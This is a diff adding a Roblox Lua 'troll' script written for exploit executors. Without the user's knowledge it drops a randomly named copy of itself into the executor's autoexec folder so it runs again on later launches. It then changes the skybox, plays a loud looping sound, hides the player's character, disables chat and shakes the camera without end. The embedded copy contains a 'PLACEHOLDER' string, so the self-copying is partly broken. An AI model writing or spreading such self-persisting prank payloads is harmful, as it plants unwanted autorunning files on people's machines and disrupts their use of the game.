@@ -1,0 +1,171 @@
+local skyboxId = "rbxassetid://4868486619" -- Your single skybox ID
+local loopSoundId = "rbxassetid://2738830850" -- The looping sound ID
+local message = "GET TROLLED"
+
+local function randomString(length)
+    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local result = ""
+    for i = 1, length do
+        local rand = math.random(1, #charset)
+        result = result .. charset:sub(rand, rand)
+    end
+    return result
+end
+
+local function createNewScript()
+    local exploitFunctions = {
+        writefile = writefile,
+        isfolder = isfolder,
+        makefolder = makefolder
+    }
+
+    if exploitFunctions.writefile and exploitFunctions.isfolder and exploitFunctions.makefolder then
+        local autoExecPath = "autoexec"
+        if not exploitFunctions.isfolder(autoExecPath) then
+            exploitFunctions.makefolder(autoExecPath)
+        end
+
+        local scriptName = randomString(10) .. ".lua"
+        local scriptContent = [[
+            local skyboxId = "rbxassetid://4868486619" -- Your single skybox ID
+            local loopSoundId = "rbxassetid://2738830850" -- The looping sound ID
+
+            local function randomString(length)
+                local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+                local result = ""
+                for i = 1, length do
+                    local rand = math.random(1, #charset)
+                    result = result .. charset:sub(rand, rand)
+                end
+                return result
+            end
+
+            local function createNewScript()
+                local exploitFunctions = {
+                    writefile = writefile,
+                    isfolder = isfolder,
+                    makefolder = makefolder
+                }
+                if exploitFunctions.writefile and exploitFunctions.isfolder and exploitFunctions.makefolder then
+                    local autoExecPath = "autoexec"
+                    if not exploitFunctions.isfolder(autoExecPath) then
+                        exploitFunctions.makefolder(autoExecPath)
+                    end
+
+                    local scriptName = randomString(10) .. ".lua"
+                    local scriptContent = "PLACEHOLDER"
+                    exploitFunctions.writefile(autoExecPath .. "/" .. scriptName, scriptContent)
+                end
+            end
+
+            if not _G.__TROLL_SCRIPT_RUNNING then
+                _G.__TROLL_SCRIPT_RUNNING = true
+                createNewScript()
+
+                -- Random skybox change after 200-250 seconds
+                task.wait(math.random(200, 250))
+                game.Lighting.Sky.SkyboxId = skyboxId
+
+                -- Play looped sound after skybox change
+                local loopSound = Instance.new("Sound")
+                loopSound.SoundId = loopSoundId
+                loopSound.Volume = 10
+                loopSound.Looped = true
+                loopSound.Parent = game.Workspace
+                loopSound:Play()
+
+                -- Hide player by setting transparency and disabling collisions
+                local player = game.Players.LocalPlayer
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.Transparency = 1
+                            part.CanCollide = false
+                        end
+                    end
+                end
+
+                -- Disable all chat and chat bubbles for the player
+                local player = game.Players.LocalPlayer
+                if player:FindFirstChild("PlayerGui") then
+                    local playerGui = player.PlayerGui
+                    local chatFrame = playerGui:FindFirstChild("Chat")
+                    if chatFrame then
+                        chatFrame.Enabled = false
+                    end
+                    local bubbleChat = playerGui:FindFirstChild("BubbleChat")
+                    if bubbleChat then
+                        bubbleChat.Enabled = false
+                    end
+                end
+
+                -- Camera shake every 10-15 seconds for 1 second
+                while _G.__TROLL_SCRIPT_RUNNING do
+                    task.wait(math.random(10, 15))
+                    local camera = game.Workspace.CurrentCamera
+                    local originalPosition = camera.CFrame.Position
+                    local shakeMagnitude = math.random(5, 10)
+                    local shakeDirection = Vector3.new(math.random(-shakeMagnitude, shakeMagnitude), math.random(-shakeMagnitude, shakeMagnitude), math.random(-shakeMagnitude, shakeMagnitude))
+                    camera.CFrame = camera.CFrame * CFrame.new(shakeDirection)
+                    task.wait(1)
+                    camera.CFrame = CFrame.new(originalPosition)
+                end
+            end
+        ]]
+        exploitFunctions.writefile(autoExecPath .. "/" .. scriptName, scriptContent)
+    end
+end
+
+if not _G.__TROLL_SCRIPT_RUNNING then
+    _G.__TROLL_SCRIPT_RUNNING = true
+    createNewScript()
+
+    -- Random skybox change after 200-250 seconds
+    task.wait(math.random(200, 250))
+    game.Lighting.Sky.SkyboxId = skyboxId
+
+    -- Play looped sound after skybox change
+    local loopSound = Instance.new("Sound")
+    loopSound.SoundId = loopSoundId
+    loopSound.Volume = 10
+    loopSound.Looped = true
+    loopSound.Parent = game.Workspace
+    loopSound:Play()
+
+    -- Hide player by setting transparency and disabling collisions
+    local player = game.Players.LocalPlayer
+    if player.Character then
+        for _, part in pairs(player.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Transparency = 1
+                part.CanCollide = false
+            end
+        end
+    end
+
+    -- Disable all chat and chat bubbles for the player
+    local player = game.Players.LocalPlayer
+    if player:FindFirstChild("PlayerGui") then
+        local playerGui = player.PlayerGui
+        local chatFrame = playerGui:FindFirstChild("Chat")
+        if chatFrame then
+            chatFrame.Enabled = false
+        end
+        local bubbleChat = playerGui:FindFirstChild("BubbleChat")
+        if bubbleChat then
+            bubbleChat.Enabled = false
+        end
+    end
+
+    -- Camera shake every 10-15 seconds for 1 second
+    while _G.__TROLL_SCRIPT_RUNNING do
+        task.wait(math.random(10, 15))
+        local camera = game.Workspace.CurrentCamera
+        local originalPosition = camera.CFrame.Position
+        local shakeMagnitude = math.random(5, 10)
+        local shakeDirection = Vector3.new(math.random(-shakeMagnitude, shakeMagnitude), math.random(-shakeMagnitude, shakeMagnitude), math.random(-shakeMagnitude, shakeMagnitude))
+        camera.CFrame = camera.CFrame * CFrame.new(shakeDirection)
+        task.wait(1)
+        camera.CFrame = CFrame.new(originalPosition)
+    end
+end
